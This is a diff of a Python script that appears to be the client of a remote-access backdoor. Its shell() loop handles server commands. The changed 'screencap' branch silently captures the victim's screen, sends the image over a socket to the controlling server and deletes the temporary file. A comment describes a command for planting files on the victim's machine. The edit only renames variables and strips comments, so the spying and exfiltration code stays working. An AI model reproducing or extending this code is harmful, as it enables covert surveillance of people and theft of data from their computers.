@@ -153,17 +153,13 @@ def shell(mySocket):
                 mySocket.send(informToServer.encode())
 
         elif 'screencap' == commandList[0]:
-            # Create a temp dir to store our screenshot file
-            # Sample dirpath: C:\Users\pulama\AppData\Local\Temp\tmp8dfj57ox
-            dirpath = tempfile.mkdtemp()
-            filename = "img.jpg"
-            fullpath = os.path.join(dirpath, filename)
+            tempPath = tempfile.mkdtemp()
+            fileName = 'img.jpg'
+            fullPath = os.path.join(tempPath, fileName)
 
-            #grab () method takes a snapshot of the screen
-            #save () method saves the snapshot in the temp dir
-            ImageGrab.grab().save(fullpath, "JPEG")
-            transfer(s, fullpath) #transfer to the Server using our transfer function
-            shutil.rmtree(dirpath) #delete the temp directory using shutil remove tree
+            ImageGrab.grab().save(fullPath, "JPEG")
+            sendFile(mySocket, fullPath)
+            shutil.rmtree(tempPath)
 
         #command format: send*<destination path>*<File Name>
         # example: send*C:\Users\John\Desktop\*photo.jpeg 
